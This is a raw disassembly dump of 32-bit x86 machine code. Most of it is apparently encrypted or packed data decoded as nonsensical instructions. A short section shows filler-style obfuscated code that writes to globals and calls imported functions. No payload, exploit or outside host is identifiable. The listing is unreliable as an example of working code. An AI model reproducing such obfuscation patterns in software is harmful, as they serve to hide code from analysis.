  406add:	sub    ebx,DWORD PTR [esi-0xf2e4450]
  406ae3:	xchg   esp,eax
  406ae4:	iret   
  406ae5:	mov    ch,0x1c
  406ae7:	dec    ecx
  406ae8:	mov    al,0xe7
  406aea:	mov    edi,DWORD PTR [eax+0x7a]
  406aed:	or     BYTE PTR [ecx+edi*8+0x70],cl
  406af1:	mov    eax,ds:0xa488d541
  406af6:	in     al,dx
  406af7:	mov    ?,WORD PTR [edx+0x5c]
  406afa:	cmp    al,0xdc
  406afc:	fs ret 
  406afe:	jecxz  0x406b05
  406b00:	sub    al,0xb7
  406b02:	popf   
  406b03:	sub    BYTE PTR [edx],dh
  406b05:	outs   dx,BYTE PTR ds:[esi]
  406b06:	retf   
  406b07:	or     DWORD PTR [eax-0x4e18a0bb],0x10
  406b0e:	ja     0x406ad3
  406b10:	sub    DWORD PTR ds:0x7a31424b,esp
  406b16:	cdq    
  406b17:	rep stos DWORD PTR es:[edi],eax
  406b19:	push   ds
  406b1a:	(bad)  [ebx+edi*2]
  406b1d:	cwde   
  406b1e:	mov    dl,0xeb
  406b20:	xor    DWORD PTR [esi-0x35],edx
  406b23:	test   DWORD PTR [eax],ebp
  406b25:	push   ebp
  406b26:	pop    eax
  406b27:	mov    edx,0xe042da83
  406b2c:	mov    ebx,0xf655ae4b
  406b31:	push   ebx
  406b32:	and    al,0x84
  406b34:	adc    edi,edi
  406b36:	jmp    0xf215:0x16a0c60b
  406b3d:	in     al,dx
  406b3e:	lods   al,BYTE PTR ds:[esi]
  406b3f:	push   ecx
  406b40:	sahf   
  406b41:	ins    DWORD PTR es:[edi],dx
  406b42:	aaa    
  406b43:	div    BYTE PTR [ebx+eax*2-0x23]
  406b47:	sahf   
  406b48:	dec    edi
  406b49:	cmp    al,0xd2
  406b4b:	inc    edi
  406b4c:	push   esp
  406b4d:	add    ah,ch
  406b4f:	rcr    ah,1
  406b51:	data16 xlat BYTE PTR ds:[ebx]
  406b53:	ds pop ecx
  406b55:	popa   
  406b56:	les    esp,FWORD PTR [edx-0x63]
  406b59:	sbb    bh,0x8d
  406b5c:	fsubr  st,st(5)
  406b5e:	add    al,0x1c
  406b60:	cmp    ecx,DWORD PTR [eax+eiz*4-0x45]
  406b64:	(bad)  
  406b65:	(bad)  
  406b66:	mov    edx,0x7a07c9df
  406b6b:	jae    0x406ba8
  406b6d:	stos   DWORD PTR es:[edi],eax
  406b6e:	add    BYTE PTR [esi-0x5f77eec5],bl
  406b74:	adc    bh,ch
  406b76:	mov    ss,WORD PTR [ecx-0x5009e182]
  406b7c:	cmp    DWORD PTR [esi+esi*4+0x7c9f049f],esp
  406b83:	test   al,0xaa
  406b85:	int3   
  406b86:	push   esi
  406b87:	adc    DWORD PTR [esi-0x5feb7198],ebp
  406b8d:	in     al,0xdd
  406b8f:	xlat   BYTE PTR ds:[ebx]
  406b90:	sbb    BYTE PTR [edx-0x4fbd641],cl
  406b96:	mov    ds:0xff87bef3,eax
  406b9b:	mov    ds:0xe66b43ac,al
  406ba0:	and    al,0x82
  406ba2:	jmp    0x406b93
  406ba4:	rcl    DWORD PTR [ebx-0x6997e719],0xcd
  406bab:	pop    es
  406bac:	int3   
  406bad:	retf   0xf98c
  406bb0:	or     al,0x27
  406bb2:	(bad)  
  406bb4:	mov    bh,0xd3
  406bb6:	or     ecx,eax
  406bb8:	push   ds
  406bb9:	adc    BYTE PTR [edx+edx*4],dh
  406bbc:	xlat   BYTE PTR ds:[ebx]
  406bbd:	out    dx,al
  406bbe:	pop    ss
  406bbf:	mov    al,ds:0xad52b81
  406bc4:	sahf   
  406bc5:	nop
  406bc6:	leave  
  406bc7:	mov    ss,WORD PTR [ecx+esi*4]
  406bca:	mov    bl,0xdb
  406bcc:	inc    ebp
  406bcd:	inc    esi
  406bce:	cdq    
  406bcf:	fwait
  406bd0:	mov    edx,0xac790217
  406bd5:	add    ebx,DWORD PTR [esi]
  406bd7:	pop    ebx
  406bd8:	pop    edi
  406bd9:	or     eax,0xe1451597
  406bde:	mov    fs,edx
  406be0:	push   esi
  406be1:	scas   eax,DWORD PTR es:[edi]
  406be2:	ss dec esp
  406be4:	dec    edi
  406be5:	mov    ecx,0x8dd41b9b
  406bea:	sub    eax,0x7d7ef88c
  406bef:	inc    esp
  406bf0:	retf   0xd091
  406bf3:	pop    esi
  406bf4:	out    0xa2,al
  406bf6:	sub    BYTE PTR [ebx],bl
  406bf8:	mov    ecx,0x6f4df78f
  406bfd:	inc    ebp
  406bfe:	mov    esi,0xb17ff9d7
  406c03:	cdq    
  406c04:	pusha  
  406c05:	aas    
  406c06:	test   DWORD PTR [edx+ebp*8],ebp
  406c09:	inc    esp
  406c0a:	xchg   DWORD PTR [ebp+0x200724f9],edx
  406c10:	sahf   
  406c11:	sbb    BYTE PTR [ecx],bh
  406c13:	fsub   st,st(2)
  406c15:	hlt    
  406c16:	jl     0x406c64
  406c18:	push   eax
  406c19:	sti    
  406c1a:	cs and dh,cl
  406c1d:	push   ds
  406c1e:	dec    eax
  406c1f:	in     eax,dx
  406c20:	sub    DWORD PTR [esi-0x30f19d7d],ecx
  406c26:	or     BYTE PTR [ebx-0x2b],cl
  406c29:	sub    DWORD PTR [esi+0x27],0xa512a36d
  406c30:	cmp    BYTE PTR [eax-0x2afff05f],0x52
  406c37:	stc    
  406c38:	push   eax
  406c39:	ds ins BYTE PTR es:[edi],dx
  406c3b:	lock push edx
  406c3d:	mov    cl,0xda
  406c3f:	in     al,dx
  406c40:	push   0xffffff91
  406c42:	lods   al,BYTE PTR ds:[esi]
  406c43:	xchg   ebx,eax
  406c44:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  406c46:	or     eax,0xa2344129
  406c4b:	adc    DWORD PTR [edi+eiz*8-0x1cb449a2],esi
  406c52:	idiv   DWORD PTR [ebp+edx*8+0x3f]
  406c56:	mov    ebx,DWORD PTR [edx+0x17]
  406c59:	or     al,0x5c
  406c5b:	mov    cl,0xe5
  406c5d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406c5e:	mov    esp,0x72dbd088
  406c63:	xchg   ebx,eax
  406c64:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406c65:	out    0x69,eax
  406c67:	pop    esp
  406c68:	mov    ebx,0xf290eb02
  406c6d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406c6e:	arpl   sp,di
  406c70:	dec    ebp
  406c71:	(bad)  
  406c72:	cmp    eax,0x39bc992b
  406c77:	mov    ebp,0x5283346e
  406c7c:	pusha  
  406c7d:	and    eax,eax
  406c7f:	pop    DWORD PTR [ecx]
  406c81:	xchg   ecx,eax
  406c82:	std    
  406c83:	mov    ecx,0x85ecb948
  406c88:	aam    0x86
  406c8a:	ret    
  406c8b:	xor    bl,dh
  406c8d:	push   0x9905b5e0
  406c92:	retf   0x2f87
  406c95:	ss (bad) 
  406c97:	ins    DWORD PTR es:[edi],dx
  406c98:	int    0x86
  406c9a:	sbb    eax,0x869c3b8d
  406c9f:	sub    dh,BYTE PTR [eax+0x2b425c26]
  406ca5:	xchg   ebx,eax
  406ca6:	leave  
  406ca7:	das    
  406ca8:	in     al,0x96
  406caa:	sbb    bh,BYTE PTR [edi+eax*2]
  406cad:	rcr    DWORD PTR [edi+eax*4-0x1],1
  406cb1:	cmp    DWORD PTR [ecx-0x58],ebx
  406cb4:	mul    BYTE PTR [esi+0x21cd13ec]
  406cba:	pushf  
  406cbb:	jecxz  0x406cc0
  406cbd:	outs   dx,DWORD PTR ds:[esi]
  406cbe:	jb     0x406cc0
  406cc0:	dec    esp
  406cc1:	fldenv [esi+eax*8+0x7f099389]
  406cc8:	mov    ah,0xa3
  406cca:	outs   dx,DWORD PTR ds:[esi]
  406ccb:	pop    ecx
  406ccc:	ret    0x42e9
  406ccf:	dec    edx
  406cd0:	pop    esp
  406cd1:	inc    esi
  406cd2:	and    al,0x9a
  406cd4:	int3   
  406cd5:	xor    eax,0xd41c7
  406cda:	xchg   ebx,eax
  406cdb:	xor    eax,0xabf93997
  406ce0:	fdivr  DWORD PTR [edx-0x46]
  406ce3:	into   
  406ce4:	mov    eax,ds:0x7eaf7550
  406ce9:	das    
  406cea:	sbb    BYTE PTR [edx+edx*1+0x31ffe016],ah
  406cf1:	adc    eax,0x559f3822
  406cf6:	xor    BYTE PTR [esi+0x2329a10e],ch
  406cfc:	pop    ebp
  406cfd:	mov    eax,0x5bb03679
  406d02:	mov    BYTE PTR [eax],ah
  406d04:	sub    bl,BYTE PTR [eiz*2-0x32b069e9]
  406d0b:	pop    ds
  406d0c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406d0d:	push   0x19
  406d0f:	in     eax,dx
  406d10:	call   DWORD PTR [ebp-0x7e332549]
  406d16:	mov    al,0x16
  406d18:	pop    ecx
  406d19:	adc    eax,0x1e14e23a
  406d1e:	adc    BYTE PTR [ecx+0xe6567e7],ah
  406d24:	xchg   edx,eax
  406d25:	pop    esp
  406d26:	mov    ch,0xd9
  406d28:	mov    bl,0xe0
  406d2a:	in     al,0x75
  406d2c:	mov    ah,0xac
  406d2e:	shl    DWORD PTR [eax],cl
  406d30:	popf   
  406d31:	adc    ch,BYTE PTR [ebp+0x19083b54]
  406d37:	mov    ecx,0xb2e841a4
  406d3c:	or     bh,dl
  406d3e:	xor    cl,BYTE PTR [ebp-0x7a]
  406d41:	or     eax,0xc4d541c7
  406d46:	xchg   esi,eax
  406d47:	nop
  406d48:	rcl    edx,1
  406d4a:	scas   al,BYTE PTR es:[edi]
  406d4b:	in     eax,dx
  406d4c:	out    dx,eax
  406d4d:	mov    eax,ds:0xce332165
  406d52:	cwde   
  406d53:	cmp    al,0xe2
  406d55:	inc    edx
  406d56:	jecxz  0x406cf8
  406d58:	mov    ch,0x5e
  406d5a:	add    cl,bh
  406d5c:	aas    
  406d5d:	mov    dl,0x84
  406d5f:	mov    ds:0xa5f0c082,eax
  406d64:	jno    0x406d9c
  406d66:	pop    es
  406d67:	jno    0x406ddb
  406d69:	lods   al,BYTE PTR ds:[esi]
  406d6a:	xchg   edi,eax
  406d6b:	shl    DWORD PTR [eax],cl
  406d6d:	mov    ds:0x6901a3d5,al
  406d72:	push   eax
  406d73:	inc    ebx
  406d74:	stos   BYTE PTR es:[edi],al
  406d75:	cli    
  406d76:	and    cl,BYTE PTR [edi]
  406d78:	imul   edx,DWORD PTR [ebx-0x15],0x4c
  406d7c:	out    0x7a,al
  406d7e:	leave  
  406d7f:	sub    DWORD PTR [ecx],esi
  406d81:	mov    ds:0x4204b456,eax
  406d86:	adc    esp,esp
  406d88:	sbb    DWORD PTR [esi-0x8e12ff5],eax
  406d8e:	ret    
  406d8f:	and    DWORD PTR [ebp-0x52],ebx
  406d92:	sti    
  406d93:	cmp    edi,esp
  406d95:	enter  0x8552,0x3e
  406d99:	pop    eax
  406d9a:	out    dx,al
  406d9b:	addr16 xchg ecx,eax
  406d9d:	mov    dl,0x8e
  406d9f:	fisttp QWORD PTR [ecx]
  406da1:	mul    DWORD PTR [ecx-0xd]
  406da4:	(bad)  
  406da6:	and    dl,BYTE PTR [edx-0x3b]
  406da9:	jae    0x406d4e
  406dab:	lahf   
  406dac:	stc    
  406dad:	inc    edx
  406dae:	ins    BYTE PTR es:[edi],dx
  406daf:	xchg   BYTE PTR [ecx-0x65ce0e5c],al
  406db5:	xchg   BYTE PTR [ebx-0x4c],cl
  406db8:	repz aaa 
  406dba:	popf   
  406dbb:	jmp    0x406d56
  406dbd:	xlat   BYTE PTR ds:[ebx]
  406dbe:	int    0x4c
  406dc0:	inc    esp
  406dc1:	ret    0xcc61
  406dc4:	sub    dl,ch
  406dc6:	cmc    
  406dc7:	sbb    eax,0xd9367354
  406dcc:	jge    0x406e3e
  406dce:	(bad)  
  406dcf:	xchg   edx,eax
  406dd0:	retf   0x27e2
  406dd3:	shr    BYTE PTR [edi-0x111f564e],cl
  406dd9:	xchg   esp,eax
  406dda:	in     al,0x36
  406ddc:	ins    BYTE PTR es:[edi],dx
  406ddd:	imul   eax,DWORD PTR ds:0x3a974615,0xffffffd1
  406de4:	or     DWORD PTR [ebp-0x7c],eax
  406de7:	fcomp  DWORD PTR [ecx-0x79]
  406dea:	pop    ss
  406deb:	sub    BYTE PTR [esi+edx*1],ah
  406dee:	scas   eax,DWORD PTR es:[edi]
  406def:	fsub   QWORD PTR es:[esi+0x5a]
  406df3:	mov    eax,0x4266522c
  406df8:	ins    DWORD PTR es:[edi],dx
  406df9:	shl    DWORD PTR [ebx],cl
  406dfb:	push   ebp
  406dfc:	stos   BYTE PTR es:[edi],al
  406dfd:	arpl   WORD PTR ds:0x79904520,bp
  406e03:	cdq    
  406e04:	push   esp
  406e05:	jp     0x406e06
  406e07:	(bad)  
  406e08:	pop    ecx
  406e09:	xor    BYTE PTR [edx-0x2928d513],0xb6
  406e10:	aad    0x89
  406e12:	mov    bl,0x6
  406e14:	add    ah,ch
  406e16:	arpl   WORD PTR [ebx+0x3932bd],si
  406e1c:	pop    edi
  406e1d:	icebp  
  406e1e:	pop    es
  406e1f:	scas   eax,DWORD PTR es:[edi]
  406e20:	(bad)  
  406e21:	fimul  WORD PTR [eax+0x7efd4c87]
  406e27:	pop    esi
  406e28:	cdq    
  406e29:	les    ecx,FWORD PTR [eax-0x34]
  406e2c:	mov    ebx,0x6f13cef5
  406e31:	pop    ebx
  406e32:	add    eax,0x85d8fc4
  406e37:	fs and al,0x1c
  406e3a:	ret    
  406e3b:	jle    0x406ea6
  406e3d:	into   
  406e3e:	mov    ds:0x7d2a15fd,eax
  406e43:	xchg   esp,eax
  406e44:	and    DWORD PTR [ecx+0x4572ac6e],edi
  406e4a:	mov    dl,0x58
  406e4c:	ret    0x23af
  406e4f:	aas    
  406e50:	shl    BYTE PTR [edx],0x38
  406e53:	jbe    0x406ecb
  406e55:	imul   ebp,DWORD PTR [edi-0x10e55c74],0xffffffd4
  406e5c:	(bad)  
  406e5d:	adc    DWORD PTR [ecx+0x48],eax
  406e60:	enter  0x3aa9,0x5
  406e64:	sbb    eax,0x31aa4a6d
  406e69:	xchg   ebx,esi
  406e6b:	sub    eax,0x6de14032
  406e70:	sbb    dh,ah
  406e72:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406e73:	das    
  406e74:	div    BYTE PTR [edi+0x694b1fd8]
  406e7a:	cdq    
  406e7b:	(bad)  
  406e7c:	std    
  406e7d:	adc    edx,DWORD PTR [ebp+0x0]
  406e80:	js     0x406e05
  406e82:	retf   
  406e83:	jne    0x406e06
  406e85:	xor    DWORD PTR [ebp-0x4e],ecx
  406e88:	xor    DWORD PTR [edx+0x62155379],eax
  406e8e:	jmp    FWORD PTR [ebx]
  406e90:	mov    ds:0x85d5baf0,al
  406e95:	daa    
  406e96:	pop    ds
  406e97:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406e98:	neg    BYTE PTR [eax-0x187df102]
  406e9e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406e9f:	inc    edx
  406ea0:	cwde   
  406ea1:	adc    BYTE PTR [ebx+0x194d42e],0xa1
  406ea8:	and    bl,BYTE PTR [eax-0x5ac69eb]
  406eae:	or     eax,0x969e1773
  406eb3:	or     DWORD PTR [edx+0x59],ebp
  406eb6:	jo     0x406f09
  406eb8:	test   eax,0xc2e26267
  406ebd:	imul   esp,esp,0xf0de406a
  406ec3:	repz ja 0x406f0a
  406ec6:	not    BYTE PTR [eax-0x28]
  406ec9:	add    esp,ebx
  406ecb:	out    dx,eax
  406ecc:	shl    DWORD PTR [ebx-0x5b99d7ee],cl
  406ed2:	mov    esp,0xde7d059d
  406ed7:	ret    0x442c
  406eda:	cli    
  406edb:	mov    bh,0x9c
  406edd:	stos   BYTE PTR es:[edi],al
  406ede:	mov    esp,ss
  406ee0:	into   
  406ee1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406ee2:	stos   BYTE PTR es:[edi],al
  406ee3:	pop    ebx
  406ee4:	loope  0x406ec9
  406ee6:	shr    DWORD PTR [esi+0x56],0x7e
  406eea:	hlt    
  406eeb:	xchg   ch,dh
  406eed:	lds    ecx,FWORD PTR [edx-0x79917021]
  406ef3:	nop
  406ef4:	scas   eax,DWORD PTR es:[edi]
  406ef5:	iret   
  406ef6:	mov    BYTE PTR [ecx+0x2b],dl
  406ef9:	test   eax,0x633ce458
  406efe:	adc    cl,0x7f
  406f01:	or     DWORD PTR [ebp+0x71],ecx
  406f04:	shr    bl,1
  406f06:	daa    
  406f07:	mov    ss,WORD PTR [edi]
  406f09:	add    DWORD PTR [eax],esp
  406f0b:	xchg   esi,eax
  406f0c:	push   esp
  406f0d:	xor    ah,BYTE PTR [edx+0x5]
  406f10:	push   cs
  406f11:	mov    bl,0x1d
  406f13:	add    al,0x1b
  406f15:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406f16:	iret   
  406f17:	add    eax,DWORD PTR [ebp-0x2b15bd68]
  406f1d:	stos   DWORD PTR es:[edi],eax
  406f1e:	add    eax,0x883a6675
  406f23:	mov    BYTE PTR [eax],bh
  406f25:	dec    edi
  406f26:	aas    
  406f27:	int3   
  406f28:	sub    al,0x9a
  406f2a:	pop    ebp
  406f2b:	push   eax
  406f2c:	sub    ebp,eax
  406f2e:	pop    eax
  406f2f:	add    BYTE PTR ds:0xfcc358cc,dl
  406f35:	getsec 
  406f37:	das    
  406f38:	mov    ebx,0xbee318b3
  406f3d:	adc    ah,BYTE PTR [ebx+edx*2]
  406f40:	loopne 0x406f38
  406f42:	dec    eax
  406f43:	pop    ecx
  406f44:	lahf   
  406f45:	adc    ecx,DWORD PTR [edx+0x6d]
  406f48:	das    
  406f49:	lahf   
  406f4a:	jae    0x406f3c
  406f4c:	fs ins DWORD PTR es:[edi],dx
  406f4e:	jecxz  0x406f7a
  406f50:	adc    BYTE PTR [edi-0x6f],0xb5
  406f54:	test   BYTE PTR [ebp-0x2e],0x8
  406f58:	adc    cl,bl
  406f5a:	stos   BYTE PTR es:[edi],al
  406f5b:	sar    BYTE PTR [edi+0x47d129e],1
  406f61:	es std 
  406f63:	test   DWORD PTR [edi-0x43],ebp
  406f66:	xor    eax,0x1a2b15f
  406f6b:	or     eax,0xb27f2b4d
  406f70:	sahf   
  406f71:	mov    ebx,0x88232bb7
  406f76:	sub    edi,DWORD PTR [ebx-0x50bc819b]
  406f7c:	loop   0x406fa1
  406f7e:	mov    al,ds:0x8e7e1614
  406f83:	ins    BYTE PTR es:[edi],dx
  406f84:	jnp    0x406f7f
  406f86:	rdpmc  
  406f88:	push   edi
  406f89:	mov    eax,0xf3e3e4eb
  406f8e:	push   0x1580a99c
  406f93:	dec    ebp
  406f94:	mov    esp,esp
  406f96:	lods   eax,DWORD PTR ds:[esi]
  406f97:	mov    esi,0x38189c23
  406f9c:	iret   
  406f9d:	nop
  406f9e:	das    
  406f9f:	adc    eax,0x16105a4a
  406fa4:	shl    ecx,0x1e
  406fa7:	xor    ecx,ecx
  406fa9:	xor    DWORD PTR ds:0x4229ba,0x4229a2
  406fb3:	or     ecx,DWORD PTR [ebp-0x1c]
  406fb6:	shr    edx,0x2
  406fb9:	xor    edx,DWORD PTR ds:0x422892
  406fbf:	mov    edx,DWORD PTR [esi+0x4]
  406fc2:	mov    DWORD PTR [ebp-0x2c],ecx
  406fc5:	cmp    DWORD PTR ds:0x422992,0x0
  406fcc:	mov    DWORD PTR ds:0x4228ee,0x4f9e
  406fd6:	mov    edx,0x30c0
  406fdb:	mov    edx,DWORD PTR ds:0x422936
  406fe1:	jmp    0x407022
  406fe6:	mov    DWORD PTR ds:0x42296a,0x6ad7
  406ff0:	je     0x407011
  406ff6:	push   0x592a
  406ffb:	call   DWORD PTR ds:0x42a018
  407001:	xor    edx,edx
  407003:	or     edx,DWORD PTR ds:0x4228b6
  407009:	xor    DWORD PTR ds:0x42294a,edx
  40700f:	add    ecx,edx
  407011:	inc    ecx
  407012:	or     ecx,0x572d
  407018:	adc    DWORD PTR ds:0x422992,0x6861
  407022:	mov    ecx,DWORD PTR [ebp+0x18]
  407025:	cmp    DWORD PTR ds:0x422966,0x0
  40702c:	mov    DWORD PTR ds:0x42299a,0x24bb
  407036:	mov    DWORD PTR ds:0x422992,0x4860
  407040:	jmp    0x4070fc
  407045:	mov    DWORD PTR ds:0x4228ea,0x356f
  40704f:	jle    0x407079
  407055:	push   DWORD PTR [ebp-0x18]
  407058:	push   0x5570
  40705d:	push   0x150b
  407062:	push   0x5476
  407067:	push   0x7791
  40706c:	push   0x2991
  407071:	call   DWORD PTR ds:0x42a01c
  407077:	inc    edx
  407078:	dec    edx
  407079:	sbb    DWORD PTR ds:0x4229c6,0x42296e
  407083:	sub    edx,DWORD PTR ds:0x422926
  407089:	cmp    DWORD PTR ds:0x4228d6,0x0
  407090:	mov    edx,DWORD PTR ds:0x422952
  407096:	mov    edx,0x5ca6
  40709b:	not    edx
  40709d:	jmp    0x4070fc
  4070a2:	mov    DWORD PTR ds:0x4228f6,0x627
  4070ac:	jae    0x4070d8
  4070b2:	push   0x5b8a
  4070b7:	push   0x190e
  4070bc:	call   DWORD PTR ds:0x42a2a0
  4070c2:	add    DWORD PTR ds:0x42297a,edi
  4070c8:	xor    DWORD PTR ds:0x42293a,edi
  4070ce:	and    DWORD PTR ds:0x4229b2,0x7045
  4070d8:	sbb    DWORD PTR ds:0x4228f6,0x244f
  4070e2:	adc    DWORD PTR ds:0x4229a2,ebx
  4070e8:	xor    edx,edx
  4070ea:	xor    edx,DWORD PTR ds:0x42296e
  4070f0:	add    edx,DWORD PTR ds:0x422986
  4070f6:	mov    DWORD PTR ds:0x42296e,edx
  4070fc:	mov    edx,DWORD PTR [ebp+0x1c]
  4070ff:	shrd   ecx,edx,0x2
  407103:	add    DWORD PTR ds:0x4229be,0x1936
  40710d:	jmp    0x407697
  407112:	loope  0x4070db
  407114:	ja     0x407111
  407116:	xor    DWORD PTR [edx],ebx
  407118:	pusha  
  407119:	pushf  
  40711a:	sub    DWORD PTR [edi],esp
  40711c:	scas   al,BYTE PTR es:[edi]
  40711d:	jb     0x407153
  40711f:	lock or esi,DWORD PTR [ecx+ecx*8+0x6d]
  407124:	push   ss
  407125:	push   ss
  407126:	cmp    eax,0xbb161604
  40712b:	ins    BYTE PTR es:[edi],dx
  40712c:	xor    ah,ah
  40712e:	push   esp
  40712f:	imul   ebx,DWORD PTR [ebx-0x7e],0xfffffff3
  407133:	push   cs
  407134:	(bad)  ds:0xf4e0d92d
  40713a:	jns    0x40712a
  40713c:	jae    0x407103
  40713e:	out    0xb5,eax
  407140:	cmp    DWORD PTR [edx+ecx*2+0x3a0a6320],ebx
  407147:	popf   
  407148:	xchg   edi,eax
  407149:	int    0xf9
  40714b:	jecxz  0x4070d9
  40714d:	mov    ds:0xca6b6f08,eax
  407152:	std    
  407153:	sar    DWORD PTR [esi-0xa],0x6
  407157:	jmp    0x7f61:0x6729b4c1
  40715e:	mov    ah,0x45
  407160:	stc    
  407161:	das    
  407162:	push   esp
  407163:	mov    esi,0x5f463280
  407168:	xchg   ecx,eax
  407169:	mov    DWORD PTR [eax+0x30],ebp
  40716c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40716d:	inc    esi
  40716e:	lds    edi,FWORD PTR ds:0xffcd313c
  407174:	cwde   
  407175:	inc    esp
  407176:	lods   eax,DWORD PTR ds:[esi]
  407177:	xor    esp,DWORD PTR [edi+0x2a]
  40717a:	jg     0x4071a6
  40717c:	retf   0x63c3
  40717f:	mov    esp,0x78c931da
  407184:	test   eax,0x49ff21d7
  407189:	push   esp
  40718a:	pop    es
  40718b:	and    DWORD PTR [edi+0x1f],0xc80e983d
  407192:	cmp    BYTE PTR ds:0x7a5dc7bf,ah
  407198:	mov    ds:0x17198299,eax
  40719d:	cmc    
  40719e:	retf   0x5996
  4071a1:	push   ds
  4071a2:	push   ecx
  4071a3:	push   0x28
  4071a5:	mov    WORD PTR [eax],gs
  4071a7:	shr    BYTE PTR [ebx+0xa203c84],0x71
  4071ae:	or     eax,0xe31db803
  4071b3:	scas   eax,DWORD PTR es:[edi]
  4071b4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4071b5:	and    edi,edx
  4071b7:	dec    esi
  4071b8:	add    eax,0x36cdd5bb
  4071bd:	repnz pushf 
  4071bf:	stos   BYTE PTR es:[edi],al
  4071c0:	adc    BYTE PTR [esi],bh
  4071c2:	add    edi,0xffffff9b
  4071c5:	push   0x5e012a6b
  4071ca:	and    esi,ebp
  4071cc:	imul   esi,DWORD PTR [edx-0x3d],0x31
  4071d0:	arpl   WORD PTR [esi+esi*4+0x40991ed1],ax
  4071d7:	or     al,0x9d
  4071d9:	push   ecx
  4071da:	push   edi
  4071db:	mov    cl,0xba
  4071dd:	jecxz  0x407182
  4071df:	add    BYTE PTR [ebp+0x6c3042da],bh
  4071e5:	in     eax,dx
  4071e6:	pop    eax
  4071e7:	cmc    
  4071e8:	xchg   edi,eax
  4071ea:	popa   
  4071eb:	imul   edi,edx,0xb
  4071ee:	mov    ds:0x256deb43,al
  4071f3:	lea    edx,[eax-0x52a98c92]
  4071f9:	cld    
  4071fa:	pop    ds
  4071fb:	jg     0x4071d2
  4071fd:	in     eax,0x11
  4071ff:	outs   dx,DWORD PTR ds:[esi]
  407200:	das    
  407201:	ins    DWORD PTR es:[edi],dx
  407202:	adc    ebp,edi
  407204:	lods   al,BYTE PTR ds:[esi]
  407205:	neg    BYTE PTR [esi]
  407207:	xchg   BYTE PTR [ebp+0x13],cl
  40720a:	and    DWORD PTR [esi+0x6b],edi
  40720d:	pop    ebx
  40720e:	cli    
  40720f:	xchg   ebp,eax
  407210:	dec    ebp
  407211:	loope  0x40724e
  407213:	nop
  407214:	dec    esp
  407215:	or     esi,0x31
  407218:	lahf   
  407219:	fstp   TBYTE PTR [esi+0x6b]
  40721c:	mov    ds:0x75b1073c,eax
  407221:	dec    esi
  407222:	repnz sbb bh,BYTE PTR [edi-0x576c140f]
  407229:	xchg   edi,eax
  40722a:	dec    ebp
  40722b:	push   ds
  40722c:	loop   0x4072a5
  40722e:	shr    DWORD PTR [edi],1
  407230:	and    BYTE PTR [ecx],cl
  407232:	and    al,0xec
  407234:	inc    edx
  407235:	mov    ah,0xd0
  407237:	inc    edi
  407238:	shl    BYTE PTR ds:0xda8ba6f5,1
  40723e:	or     cl,ah
  407240:	fcomp  DWORD PTR [ecx+0x58d076a4]
  407246:	dec    eax
  407247:	push   0x3d0f6019
  40724c:	cmovne esi,DWORD PTR [ecx-0x386bc982]
  407253:	pop    esp
  407254:	push   ebp
  407255:	test   al,0x7b
  407257:	sahf   
  407258:	sbb    al,0x6
  40725a:	xlat   BYTE PTR ds:[ebx]
  40725b:	push   ecx
  40725c:	das    
  40725d:	jo     0x4071ea
  40725f:	stos   DWORD PTR es:[edi],eax
  407260:	repz lds ebp,FWORD PTR [ebx-0x703198f7]
  407267:	fisttp WORD PTR [ebx-0x150f0a07]
  40726d:	dec    ecx
  40726e:	xor    edx,DWORD PTR [edi-0x141eed8f]
  407274:	repz aas 
  407276:	fidivr DWORD PTR [eax-0x21]
  407279:	fstp   QWORD PTR [ebx]
  40727b:	cmp    esi,DWORD PTR [eax+ecx*2-0x10]
  40727f:	adc    BYTE PTR [eax-0x44],bl
  407282:	out    dx,al
  407283:	sub    dl,BYTE PTR [edi+0x3db9f21c]
  407289:	add    al,0x6
  40728b:	in     eax,dx
  40728c:	jp     0x4072c1
  40728e:	pop    ebp
  40728f:	or     al,0x57
  407291:	dec    edi
  407292:	dec    ecx
  407293:	(bad)
  407296:	mov    dh,0x70
  407298:	out    dx,eax
  407299:	sub    edi,DWORD PTR [esi]
  40729b:	popf   
  40729c:	cli    
  40729d:	out    0xb0,al
  40729f:	and    eax,0x28b5b96e
  4072a4:	push   ecx
  4072a5:	sbb    eax,0x95915108
  4072aa:	xor    eax,0x6bfbc5d2
  4072af:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  4072b1:	test   eax,0x77a7415b
  4072b6:	cs iret 
  4072b8:	icebp  
  4072b9:	xor    ebx,eax
  4072bb:	out    dx,eax
  4072bc:	clc    
  4072bd:	dec    esi
  4072be:	add    DWORD PTR [ebp+0x24],0x26
  4072c2:	mov    ds:0x3884ed6d,al
  4072c7:	pop    ebp
  4072c8:	(bad)  
  4072ca:	xor    BYTE PTR [ecx+0x7b481b91],dh
  4072d0:	dec    esi
  4072d1:	add    DWORD PTR [eax],eax
  4072d3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4072d4:	xor    BYTE PTR [edi+edx*8-0x7c],dl
  4072d8:	test   al,0x60
  4072da:	mov    ebx,ss
  4072dc:	sar    ebp,1
  4072de:	mov    ds:0x33bc8776,al
  4072e3:	fucom  st(2)
  4072e5:	sar    ah,0x38
  4072e8:	in     al,dx
  4072e9:	or     BYTE PTR [eax],bh
  4072eb:	or     edx,DWORD PTR [ebp+0x1d]
  4072ee:	pop    es
  4072ef:	pop    es
  4072f0:	or     eax,0xeda123b6
  4072f5:	enter  0x8fdd,0x6
  4072f9:	mov    ?,WORD PTR [edi+0x12]
  4072fc:	cmp    BYTE PTR [ebp-0x27],ah
  4072ff:	mov    ecx,0xdc246c8b
  407304:	dec    ebp
  407305:	dec    ebp
  407306:	inc    eax
  407307:	mov    dh,0x24
  407309:	mov    ah,0xef
  40730b:	and    eax,0xe8ad39e4
  407310:	add    BYTE PTR ds:0xf6fa598f,cl
  407316:	inc    ecx
  407317:	icebp  
  407318:	lods   eax,DWORD PTR ds:[esi]
  407319:	aam    0xbb
  40731b:	mov    esp,0x3db9e44c
  407320:	inc    ebx
